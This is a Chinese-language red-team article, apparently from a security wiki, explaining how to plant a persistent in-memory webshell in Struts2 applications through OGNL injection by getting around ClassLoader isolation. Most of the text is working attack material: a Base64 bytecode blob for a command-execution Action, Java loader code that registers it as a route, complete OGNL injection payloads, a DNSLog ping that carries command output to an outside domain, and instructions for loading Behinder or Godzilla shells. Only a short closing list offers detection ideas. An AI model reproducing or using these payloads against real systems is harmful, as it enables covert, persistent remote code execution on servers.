---
title: Struts2内存马注入技术详解：OGNL表达式利用、ClassLoader隔离问题与#this.class.getClassLoader()突破方案
description: 深度解析Struts2内存马注入技术，从直接代码注入成功案例切入，详细剖析OGNL表达式注入因ClassLoader隔离导致的失败原因，揭示通过#this.class.getClassLoader()获取正确类加载器的突破方案，包含完整Payload构造、恶意类字节码加载、ActionConfig动态注册等实战细节。
category: program-analysis
tags:
- Struts2
- Memory Shell
- OGNL Injection
- ClassLoader Isolation
- Java Security
- Webshell
- Red Teaming
date: '2023-02-23'
updated: '2026-11-15'
---

## 背景

Struts2 作为经典 Java Web 框架，其 OGNL 表达式注入漏洞（如 S2-016、S2-032、S2-045 等）历来是攻防演练中的高危漏洞类型。传统利用方式多为执行系统命令、读写文件或反弹 Shell，但这类操作易被 WAF、RASP 及主机层面的命令审计拦截。内存马技术因其**无文件落地、隐蔽性强、持久化能力强**等特点，成为红队作业的首选后渗透手段。

本文复盘从 Struts2 Action 直接代码注入内存马成功，到 OGNL 表达式注入受阻于 ClassLoader 隔离，最终通过 `#this.class.getClassLoader()` 突破类加载器隔离实现纯 OGNL 表达式注入内存马的完整攻击链。

## 直接代码注入内存马成功验证

在 Struts2 Action 方法中直接编写 Java 代码注入内存马，可作为基准验证内存马逻辑的可行性。

### struts.xml 配置示例

```xml
<action name="login111" class="com.demo.action.LoginAction">
    <result name="success">/success.jsp</result>
</action>
```

### Action 方法中注入内存马核心逻辑

```java
// 伪代码演示核心流程
public String test2() {
    // 1. 获取 runtimeConfiguration -> namespaceActionConfigs -> LinkedHashMap obj5
    // 2. 定义恶意类字节码
    String evilClassBase64 = "yv66vgAAADQApAoAIQBFCgBGAEcHAEgIAEkKAEYASgcASwgATAcATQsACABOBwBPCgBQAFEIAFILAAYAUwoAUABUCgBVAFYKAAoAVwgAWAoACgBZCgAKAFoKAFsAXAoAWwBdCgBeAF8HAGAKAGEAYgoAXgBjCgBkAGUJAGYAZwoAaABpCgBqAGsKADoAbAoAbQBuCgBqAFwHAG8BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFUxjb20vZGVtby9hY3Rpb24vQ21kOwEAB2V4ZWN1dGUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAApFeGNlcHRpb25zBwBwAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABHBvb2wBABVMamF2YXNzaXN0L0NsYXNzUG9vbDsBAAVjbGF6egEAE0xqYXZhc3Npc3QvQ3RDbGFzczsBAAdlbmNvZGVyBwBxAQAHRW5jb2RlcgEADElubmVyQ2xhc3NlcwEAGkxqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXI7AQABcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwcAcgcAcwcAdAEAClNvdXJjZUZpbGUBAAhDbWQuamF2YQwAIgAjBwB1DAB2AHcBACBvcmcvYXBhY2hlL3N0cnV0czIvU3RydXRzU3RhdGljcwEANWNvbS5vcGVuc3ltcGhvbnkueHdvcmsyLmRpc3BhdGNoZXIuSHR0cFNlcnZsZXRSZXF1ZXN0DAB4AHkBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQA2Y29tLm9wZW5zeW1waG9ueS54d29yazIuZGlzcGF0Y2hlci5IdHRwU2VydmxldFJlc3BvbnNlAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UMAHoAewEAEWphdmEvdXRpbC9TY2FubmVyBwB8DAB9AH4BAAFjDAB/AIAMAIEAggcAgwwAhACFDAAiAIYBAAJcQQwAhwCIDACJACoHAIoMAIsAjAwAjQAjBwCODACPAJABABNjb20vZGVtby9hY3Rpb24vQ21kBwCRDACSACoMAHgAkwcAlAwAlQCWBwCXDACYAJkHAJoMAJsAnAcAnQwAiwCeDACfAKAHAKEMAKIAowEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAYamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyAQAbamF2YXNzaXN0L05vdEZvdW5kRXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAIGphdmFzc2lzdC9DYW5ub3RDb21waWxlRXhjZXB0aW9uAQAlY29tL29wZW5zeW1waG9ueS94d29yazIvQWN0aW9uQ29udGV4dAEACmdldENvbnRleHQBACkoKUxjb20vb3BlbnN5bXBob255L3h3b3JrMi9BY3Rpb25Db250ZXh0OwEAA2dldAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEAE2phdmFzc2lzdC9DbGFzc1Bvb2wBAApnZXREZWZhdWx0AQAXKClMamF2YXNzaXN0L0NsYXNzUG9vbDsBAA9qYXZhL2xhbmcvQ2xhc3MBAAdnZXROYW1lAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXNzaXN0L0N0Q2xhc3M7AQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBABwoKUxqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAEWphdmFzc2lzdC9DdENsYXNzAQAKdG9CeXRlY29kZQEABCgpW0IBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAEKEkpVgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TdHJpbmcBAAZsZW5ndGgBAAMoKUkAIQAXACEAAAAAAAMAAQAiACMAAQAkAAAALwABAAEAAAAFKrcAAbEAAAACACUAAAAGAAEAAAAQACYAAAAMAAEAAAAFACcAKAAAAAEAKQAqAAIAJAAAAJoABgADAAAATLgAAhIEtgAFwAAGTLgAAhIHtgAFwAAITSy5AAkBALsAClm4AAsrEgy5AA0CALYADrYAD7cAEBIRtgAStgATtgAULLkACQEAtgAVAbAAAAACACUAAAAWAAUAAAATAAwAFAAYABYAQQAXAEoAGAAmAAAAIAADAAAATAAnACgAAAAMAEAAKwAsAAEAGAA0AC0ALgACAC8AAAAEAAEAMAAJADEAMgACACQAAACpAAIABQAAADu4ABZMKxIXtgAYtgAZTbgAGk6yABsstgAcvrYAHS0stgActgAeOgSyABsZBLYAH7YAHbIAGxkEtgAgsQAAAAIAJQAAACIACAAAAB0ABAAfAA4AIQASACMAHQAkACcAJQAyACYAOgAnACYAAAA0AAUAAAA7ADMANAAAAAQANwA1ADYAAQAOAC0ANwA4AAIAEgApADkAPQADACcAFAA+AD8ABAAvAAAACAADAEAAQQBCAAIAQwAAAAIARAA8AAAACgABADoAZAA7AAk=";
    
    byte[] decode = java.util.Base64.getDecoder().decode(evilClassBase64);
    
    // 3. 利用 ClassLoader.defineClass 定义类
    Class<?> evilClass = (Class<?>) Thread.currentThread().getContextClassLoader()
        .getClass().getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class)
        .invoke(Thread.currentThread().getContextClassLoader(), "com.demo.action.Cmd", decode, 0, decode.length);
    
    // 4. 动态构造 ActionConfig 并注册到 namespaceActionConfigs
    Constructor<?> constructor = Class.forName("com.opensymphony.xwork2.config.entities.ActionConfig")
        .getDeclaredConstructor(String.class, String.class, String.class);
    constructor.setAccessible(true);
    Object actionConfig = constructor.newInstance("f0ng", "onlysecurity", "com.demo.action.Cmd");
    
    obj5.put("/", actionConfig); // 或 obj5.put("", actionConfig) 视 namespace 而定
    
    return SUCCESS;
}
```

访问 `/login111!test2.action` 即可完成内存马注入，后续请求 `/f0ng.action` 触发恶意逻辑执行任意命令。

## OGNL 表达式注入内存马失败分析

尝试将上述 Java 逻辑转换为 OGNL 表达式一次性注入时，遭遇两大核心阻碍。

### 问题一：恶意类加载后找不到 Struts2 核心类

若将完整注入逻辑封装在外部恶意类 `hello.class` 中，通过 `URLClassLoader` 加载并调用：

```ognl
#bb0=new java.net.URL[]{new java.net.URL("file:/xxxx/xxxxx")},
#cc0=new java.net.URLClassLoader(#bb0),
#cc1=#cc0.loadClass("hello"),
#cc1.getDeclaredMethods()[0].invoke("main", new java.lang.String[]{"a"}, #obj5)
```

**报错**：`ClassNotFoundException: com.opensymphony.xwork2.ActionContext` 等核心类。

**根因**：`URLClassLoader` 以 `file:/xxxx/xxxxx` 为代码源，其父加载器为系统类加载器，无法委派加载 Web 应用类加载器（WebappClassLoader）已加载的 Struts2 类。恶意类运行时上下文与目标应用类加载器隔离。

### 问题二：OGNL 表达式中无法创建 Thread 对象

尝试在 OGNL 表达式内直接通过反射调用 `Thread.currentThread().getContextClassLoader()` 等操作时，发现 `new java.lang.Thread()` 等实例化操作在 OGNL 沙箱中受限或行为异常，无法顺利获取当前线程上下文类加载器。

### 阶段性成果：可交互的远程加载类执行命令

虽未突破 ClassLoader 隔离，但发现可利用外部恶意类实现**可交互命令执行**：

```ognl
redirect:http://www.baidu.com${#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#resp.setCharacterEncoding('UTF-8'),#ot=#resp.getWriter(),#bb0=new java.net.URL[]{new java.net.URL("file:/xxxx/xxxxx")},#cc0=new java.net.URLClassLoader(#bb0),#cc1=#cc0.loadClass("hello"),#ot.print(#cc1.getDeclaredMethods()[0].invoke("main",new java.lang.String[]{"a"},"cccc")),#ot.flush(),#ot.close()}
```

恶意类 `hello.class` 接收参数拼接至 DNSLog 域名，实现**无回显命令执行确认**：

```java
public static void main(String[] args, String a) {
    new hello1(a);
}
public hello1(String a) {
    try { Runtime.getRuntime().exec(new String[]{"ping","-c","1", a + "123412.xxxx.xxxxx.cn"}); } catch (Exception e) {}
}
```

此技巧可在无回显环境下确认 RCE 存在，但无法实现持久化内存马。

## ClassLoader 隔离本质与突破口发现

### 核心误区：强行跨类加载器转型

尝试在恶意类中通过 `ClassLoader.defineClass` 定义 `ActionConfig` 并强转插入 `obj5`（`LinkedHashMap`）时，报错：

```
class com.opensymphony.xwork2.config.entities.ActionConfig cannot be cast to class com.opensymphony.xwork2.config.entities.ActionConfig
```

**原因**：恶意类由 `URLClassLoader` 加载，定义的 `ActionConfig` 类对象属于该加载器命名空间；而 `obj5` 中存储的原有 `ActionConfig` 实例属于 WebappClassLoader 命名空间。**同类名、不同类加载器加载的类在 JVM 中是完全不同的类型**，不可互相赋值。

### 突破口：`#this.class.getClassLoader()`

通过 OGNL 表达式枚举上下文对象，发现隐藏变量 `#this` 指向当前 Action 实例：

```ognl
#this.class.getClassLoader()
```

**验证**：在 Action 代码注入场景下调试，`Thread.currentThread().getContextClassLoader()` 与 `#this.class.getClassLoader()` 返回**完全一致**的 WebappClassLoader 实例。

> 该类加载器拥有加载 Struts2 全量类、应用业务类的能力，是注入内存马的**正确类加载器上下文**。

## 纯 OGNL 表达式注入内存马完整实现

### 恶意类 hello.java 设计

恶意类不再依赖外部文件加载，而是接收正确的 `ClassLoader` 实例与 `obj5` 引用，内部通过 `defineClass` 定义恶意 Action 类并动态注册：

```java
public class hello {
    public hello(java.util.Map obj5) throws Exception {
        try {
            // 1. 恶意 Action 类字节码
            String s = "yv66vgAAADQApAoAIQBFCgBGAEcHAEgIAEkKAEYASgcASwgATAcATQsACABOBwBPCgBQAFEIAFILAAYAUwoAUABUCgBVAFYKAAoAVwgAWAoACgBZCgAKAFoKAFsAXAoAWwBdCgBeAF8HAGAKAGEAYgoAXgBjCgBkAGUJAGYAZwoAaABpCgBqAGsKADoAbAoAbQBuCgBqAFwHAG8BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFUxjb20vZGVtby9hY3Rpb24vQ21kOwEAB2V4ZWN1dGUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAApFeGNlcHRpb25zBwBwAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABHBvb2wBABVMamF2YXNzaXN0L0NsYXNzUG9vbDsBAAVjbGF6egEAE0xqYXZhc3Npc3QvQ3RDbGFzczsBAAdlbmNvZGVyBwBxAQAHRW5jb2RlcgEADElubmVyQ2xhc3NlcwEAGkxqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXI7AQABcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwcAcgcAcwcAdAEAClNvdXJjZUZpbGUBAAhDbWQuamF2YQwAIgAjBwB1DAB2AHcBACBvcmcvYXBhY2hlL3N0cnV0czIvU3RydXRzU3RhdGljcwEANWNvbS5vcGVuc3ltcGhvbnkueHdvcmsyLmRpc3BhdGNoZXIuSHR0cFNlcnZsZXRSZXF1ZXN0DAB4AHkBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQA2Y29tLm9wZW5zeW1waG9ueS54d29yazIuZGlzcGF0Y2hlci5IdHRwU2VydmxldFJlc3BvbnNlAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UMAHoAewEAEWphdmEvdXRpbC9TY2FubmVyBwB8DAB9AH4BAAFjDAB/AIAMAIEAggcAgwwAhACFDAAiAIYBAAJcQQwAhwCIDACJACoHAIoMAIsAjAwAjQAjBwCODACPAJABABNjb20vZGVtby9hY3Rpb24vQ21kBwCRDACSACoMAHgAkwcAlAwAlQCWBwCXDACYAJkHAJoMAJsAnAcAnQwAiwCeDACfAKAHAKEMAKIAowEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAYamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyAQAbamF2YXNzaXN0L05vdEZvdW5kRXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAIGphdmFzc2lzdC9DYW5ub3RDb21waWxlRXhjZXB0aW9uAQAlY29tL29wZW5zeW1waG9ueS94d29yazIvQWN0aW9uQ29udGV4dAEACmdldENvbnRleHQBACkoKUxjb20vb3BlbnN5bXBob255L3h3b3JrMi9BY3Rpb25Db250ZXh0OwEAA2dldAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEAE2phdmFzc2lzdC9DbGFzc1Bvb2wBAApnZXREZWZhdWx0AQAXKClMamF2YXNzaXN0L0NsYXNzUG9vbDsBAA9qYXZhL2xhbmcvQ2xhc3MBAAdnZXROYW1lAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXNzaXN0L0N0Q2xhc3M7AQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBABwoKUxqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAEWphdmFzc2lzdC9DdENsYXNzAQAKdG9CeXRlY29kZQEABCgpW0IBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAEKEkpVgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TdHJpbmcBAAZsZW5ndGgBAAMoKUkAIQAXACEAAAAAAAMAAQAiACMAAQAkAAAALwABAAEAAAAFKrcAAbEAAAACACUAAAAGAAEAAAAQACYAAAAMAAEAAAAFACcAKAAAAAEAKQAqAAIAJAAAAJoABgADAAAATLgAAhIEtgAFwAAGTLgAAhIHtgAFwAAITSy5AAkBALsAClm4AAsrEgy5AA0CALYADrYAD7cAEBIRtgAStgATtgAULLkACQEAtgAVAbAAAAACACUAAAAWAAUAAAATAAwAFAAYABYAQQAXAEoAGAAmAAAAIAADAAAATAAnACgAAAAMAEAAKwAsAAEAGAA0AC0ALgACAC8AAAAEAAEAMAAJADEAMgACACQAAACpAAIABQAAADu4ABZMKxIXtgAYtgAZTbgAGk6yABsstgAcvrYAHS0stgActgAeOgSyABsZBLYAH7YAHbIAGxkEtgAgsQAAAAIAJQAAACIACAAAAB0ABAAfAA4AIQASACMAHQAkACcAJQAyACYAOgAnACYAAAA0AAUAAAA7ADMANAAAAAQANwA1ADYAAQAOAC0ANwA4AAIAEgApADkAPQADACcAFAA+AD8ABAAvAAAACAADAEAAQQBCAAIAQwAAAAIARAA8AAAACgABADoAZAA7AAk=";
            byte[] decode = java.util.Base64.getDecoder().decode(s);
            
            // 2. 利用传入的正确 ClassLoader 定义类
            Class<?> evilClass = (Class<?>) this.getClass().getClassLoader()
                .getClass().getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class)
                .invoke(this.getClass().getClassLoader(), "com.demo.action.Cmd", decode, 0, decode.length);
            
            // 3. 动态构造 ActionConfig 注册
            Constructor<?> constructor = Class.forName("com.opensymphony.xwork2.config.entities.ActionConfig", true, this.getClass().getClassLoader())
                .getDeclaredConstructor(String.class, String.class, String.class);
            constructor.setAccessible(true);
            Object actionConfig = constructor.newInstance("f0ng", "onlysecurity", "com.demo.action.Cmd");
            
            obj5.put("/", actionConfig); // namespace 为根路径
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args, java.util.Map obj5) throws Exception {
        new hello(obj5);
    }
}
```

编译为 `hello.class` 并放置于可通过 `file://` 协议访问的路径。

### 最终 OGNL Payload 构造

```ognl
redirect:http://www.baidu.com${
    #req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),
    #resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),
    #resp.setCharacterEncoding('UTF-8'),
    #ot=#resp.getWriter(),
    #inv=#context.get('com.opensymphony.xwork2.ActionContext.actionInvocation'),
    #f2=#inv.getClass().getDeclaredField("proxy"), #f2.setAccessible(true),
    #obj=#f2.get(#inv),
    #f3=#obj.getClass().getSuperclass().getDeclaredField("configuration"), #f3.setAccessible(true),
    #obj2=#f3.get(#obj),
    #f4=#obj2.getClass().getDeclaredField("runtimeConfiguration"), #f4.setAccessible(true),
    #obj3=#f4.get(#obj2),
    #f5=#obj3.getClass().getDeclaredField("namespaceActionConfigs"), #f5.setAccessible(true),
    #obj4=#f5.get(#obj3),
    #f6=#obj4.getClass().getDeclaredField("m"), #f6.setAccessible(true),
    #obj5=#f6.get(#obj4),
    #bb0=new java.net.URL[]{new java.net.URL("file:/xxxxx/xxxxx/")},
    #cc0=new java.net.URLClassLoader(#bb0, #this.class.getClassLoader()),  // 关键：指定父加载器为正确的 WebappClassLoader
    #cc1=#cc0.loadClass("hello"),
    #cc1.getDeclaredMethods()[0].invoke("main", new java.lang.String[]{"a"}, #obj5),
    #ot.flush(), #ot.close()
}
```

**关键点解析**：

| 步骤 | 说明 |
|------|------|
| 反射链获取 `obj5` | 通过 `ActionInvocation -> proxy -> configuration -> runtimeConfiguration -> namespaceActionConfigs -> m` 链路获取存储 ActionConfig 的 `LinkedHashMap` |
| `URLClassLoader` 指定父加载器 | `new URLClassLoader(urls, #this.class.getClassLoader())` 使恶意类加载器委派给 WebappClassLoader，解决核心类可见性问题 |
| 恶意类内部使用 `this.getClass().getClassLoader()` | `hello` 类实例由上述 `URLClassLoader` 加载，其 `getClass().getClassLoader()` 即为该 `URLClassLoader`，再通过 `defineClass` 定义恶意 Action 类，因父加载器正确，定义出的类可被 Struts2 框架识别并实例化 |

访问注入 URL 后，内存马注册成功，后续请求 `/f0ng.action` 即可触发冰蝎/哥斯拉等管理型内存马逻辑。

## 进阶：集成冰蝎/哥斯拉管理型内存马

利用 [poc2jar](https://github.com/su18/poc2jar) 等工具将冰蝎、哥斯拉的 Java 内存马字节码转为 Base64 字符串，替换 `hello.java` 中的 `s` 变量，即可实现**带交互管理界面的持久化内存马**。

```java
// 示例：冰蝎内存马字节码 Base64
String s = "yv66vgAAADQA..."; // poc2jar 导出的 Base64
byte[] decode = java.util.Base64.getDecoder().decode(s);
// 后续 defineClass 与注册逻辑不变
```

## 总结与坑点避坑指南

### 核心认知

1. **内存马本质**：向框架核心组件（Struts2 为 `namespaceActionConfigs`）动态注册恶意 Action/Controller/Filter/Listener 等组件，实现无文件持久化代码执行。
2. **ClassLoader 是核心门控**：恶意类字节码**必须由目标应用类加载器（或其子加载器）定义**，否则框架无法识别、实例化、调用。
3. **OGNL 上下文藏宝**：`#this` 变量指向当前 Action 实例，`#this.class.getClassLoader()` 是获取正确 WebappClassLoader 的通用钥匙。
4. **跨类加载器类型不兼容**：同全限定名、不同加载器加载的类在 JVM 中是**完全不同类型**，不可强转、不可赋值。

### 常见坑点

| 坑点 | 现象 | 解决方案 |
|------|------|----------|
| `namespaceActionConfigs` key 不匹配 | 注入后访问 404 | 根据实际 namespace 选择 `obj5.put("/", actionConfig)` 或 `obj5.put("", actionConfig)` |
| 恶意类字节码版本过高 | `UnsupportedClassVersionError` | 编译目标版本需 ≤ 目标 JVM 版本（如 `-target 1.8`） |
| `defineClass` 权限不足 | `SecurityException` | 目标环境无 SecurityManager 或策略允许；若受限需寻找 `AccessController.doPrivileged` 绕过 |
| OGNL 表达式长度超限 | WAF/容器截断 | 采用分段赋值、外部加载字节码、压缩编码等技巧缩短 Payload |

### 防御视角建议

- **类加载器监控**：监控 `URLClassLoader` 实例化及 `defineClass` 反射调用，关联父加载器为 WebappClassLoader 的异常行为。
- **OGNL 沙箱加固**：禁用 `#this`、限制反射访问 `ClassLoader`、`defineClass` 等敏感方法。
- **运行时完整性校验**：定期校验 `namespaceActionConfigs`、`runtimeConfiguration` 等核心集合是否被篡改。
- **流量层面**：检测包含 `class.getClassLoader()`、`defineClass`、`namespaceActionConfigs` 等特征的 OGNL Payload。

## 交叉引用与延伸阅读

- [[aceldr-technical-analysis]] — PE 不落地执行技术体系，对比 Java 内存马与原生代码内存执行的异同
- [[memory-scanning-tools-evasion-techniques]] — 内存扫描工具检测原理与 UDRL 规避实现，关联内存马对抗内存查杀视角
- [[xd-security-deserialization-xxe-notes-day37-39]] — Java 反序列化漏洞利用链，另一条通向任意代码执行的经典路径
- [[process-injection-tampering-techniques]] — 进程注入与篡改技术体系，拓展内存马概念至操作系统层面
- [[xd-security-pentest-basic-stage-notes]] — 渗透测试基础阶段知识清单，含 SQL 注入、文件上传等前置攻击面

## 参考资料

1. [Struts2 的内存马](https://www.cnblogs.com/xiaozhiru/p/16163057.html)
2. [Struts2 的 OGNL 详解](https://blog.csdn.net/xlgen157387/article/details/39735703)
3. [Vulhub Struts2 S2-016 环境](https://github.com/vulhub/vulhub/tree/master/struts2/s2-016)
4. [poc2jar - 内存马字节码生成工具](https://github.com/su18/poc2jar)
5. [先知社区原文](https://xz.aliyun.com/t/12237)

## 来源

- [0x6270安全团队-202203-202304_13](../sources/0x6270安全团队-202203-202304_13.md)
